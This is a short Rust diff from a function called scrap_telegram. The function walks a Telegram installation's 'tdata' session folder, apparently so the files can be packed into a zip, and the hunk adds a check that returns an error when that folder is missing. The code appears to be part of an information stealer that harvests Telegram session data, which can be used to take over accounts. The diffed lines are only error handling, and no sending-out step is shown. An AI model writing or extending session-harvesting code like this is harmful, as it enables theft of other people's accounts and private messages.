@@ -35,6 +35,9 @@ pub fn scrap_telegram(telegram_path: &PathBuf, telegram_zip_path: &PathBuf, loca
     else{
         tdata_path = telegram_path.join("tdata");
     }
+    if !tdata_path.exists(){
+        return Err("tdata folder wasn't found");
+    }
     let tdata_path_len = tdata_path.to_str().unwrap().len();
     for entry in WalkDir::new(&tdata_path) {
         let entry = entry.unwrap();
